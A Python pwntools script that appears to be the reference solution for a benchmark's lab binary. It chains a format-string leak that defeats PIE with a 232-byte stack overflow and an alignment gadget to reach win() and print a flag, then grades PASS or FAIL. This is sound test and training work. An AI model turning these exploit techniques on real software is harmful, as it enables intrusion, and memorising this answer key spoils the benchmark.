#!/usr/bin/env python3
"""
Hand-verified standalone pwntools reference exploit for corpus_r2 target
05_fmtstr_pie_leak.

Technique: format-string arbitrary READ used to defeat PIE (not a canary
leak, unlike round-1's 05_fmtstr_arbread which had canary=ON/PIE=OFF),
followed by a plain stack buffer overflow straight to win() once its real
runtime address is known.

Protections: canary=OFF, NX=ON, PIE=ON, RELRO=full (toolchain default for
-pie -fPIE), dynamic.

Steps:
  1. vuln() spills a local `void (*self)(void) = vuln;` onto the stack
     before reading attacker input into a 128-byte `name` buffer and
     passing it directly to printf() (a classic uncontrolled format
     string). `self` is discoverable via %N$p scanning; empirically
     confirmed (via /proc/<pid>/maps cross-reference) that **index 32**
     leaks the exact runtime address of vuln() on this build.
  2. leaked_vuln - elf.symbols['vuln'] gives the PIE base (vuln's static
     offset is fixed at link time). win()'s real address follows directly
     via base + elf.symbols['win'].
  3. A second, unrelated read() into a 64-byte `buf` has no bounds check
     and overflows into the saved return address. Confirmed via objdump:
     `buf` sits at rbp-0xe0 (the very bottom of vuln()'s 0xe0-byte stack
     frame), so the saved return address sits exactly 0xe0 + 8 = 232
     bytes past buf's start (leave restores rbp, then the next 8-byte
     slot is the return address). The offset is NOT simply
     sizeof(buf) + 8 -- there's a large gap because buf is declared last
     among vuln()'s locals but the compiler placed it at the frame's
     bottom edge, with `name` and other locals above it.
  4. 232 bytes of filler + p64(win_addr) redirects execution straight to
     win(), which prints FLAG via puts(FLAG) -- no further protections to
     bypass (canary is off for this target).

Anti-gaming: confirmed benign/ordinary input (e.g. "hello"/"world" on the
two prompts) produces no flag and exits cleanly (rc=0) -- the flag is only
reachable via the genuine two-stage leak + overflow chain above. The read()
size for the second stage was intentionally set to 300 (comfortably above
the 232+8=240 bytes needed) so the overflow is actually reachable; an
earlier version of this target capped that read at 200 bytes, which made
the bug structurally unreachable and was fixed before this exploit was
written.

Run directly:
    python3 05_fmtstr_pie_leak_reference.py
"""
import os
import sys

from pwn import *

HERE = os.path.dirname(os.path.abspath(__file__))
TARGET_DIR = os.path.join(HERE, "..", "corpus_r2", "05_fmtstr_pie_leak")
BINARY = os.path.join(TARGET_DIR, "fmtstr_pie_leak")
FLAG_FILE = os.path.join(TARGET_DIR, "flag.txt")

context.arch = "amd64"
context.log_level = "error"

LEAK_FMT_INDEX = 32
OVERFLOW_OFFSET = 232  # buf (rbp-0xe0) -> saved return address (rbp+8)


def exploit():
    elf = ELF(BINARY, checksec=False)
    io = process(elf.path, cwd=TARGET_DIR)

    io.recvuntil(b"name: ")
    io.sendline(f"%{LEAK_FMT_INDEX}$p".encode())
    leaked = int(io.recvline().strip(), 16)

    base = leaked - elf.symbols["vuln"]
    win_addr = base + elf.symbols["win"]
    # A `ret`-based return-address overwrite lands the callee 8 bytes off
    # the ABI-mandated 16-byte stack alignment (a `ret` doesn't do the
    # extra push a real `call` would), which is harmless for a bare
    # puts() but faults inside fopen()'s internal malloc() (SIMD-aligned
    # code) now that win() reads flag.txt at runtime. One extra `ret`
    # gadget (the tail of win() itself, "pop rbp; ret" at file offset
    # 0x131f-0x1320) consumes one more 8-byte stack slot and restores
    # correct alignment before actually landing in win().
    ret_fixer = base + 0x1320

    io.recvuntil(b"buf: ")
    payload = b"A" * OVERFLOW_OFFSET + p64(ret_fixer) + p64(win_addr)
    io.sendline(payload)
    return io


def main():
    with open(FLAG_FILE) as f:
        expected_flag = f.read().strip()

    io = exploit()
    output = io.recvrepeat(timeout=3)
    io.close()

    ok = expected_flag.encode() in output
    print(f"[{'PASS' if ok else 'FAIL'}] 05_fmtstr_pie_leak: "
          f"expected flag {'found' if ok else 'NOT found'} in output")
    if not ok:
        print("---- captured output ----")
        print(output)
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
